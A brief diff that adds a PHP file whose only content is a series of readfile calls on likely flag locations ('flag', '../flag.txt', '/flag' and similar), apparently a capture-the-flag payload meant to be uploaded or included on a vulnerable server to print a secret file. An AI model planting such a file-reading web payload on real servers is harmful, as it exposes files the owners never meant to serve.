@@ -1,0 +1,8 @@
+<?php
+readfile("flag");
+readfile("flag.txt");
+readfile("../flag.txt");
+readfile("../flag");
+readfile("/flag");
+readfile("/flag.txt");
+?>
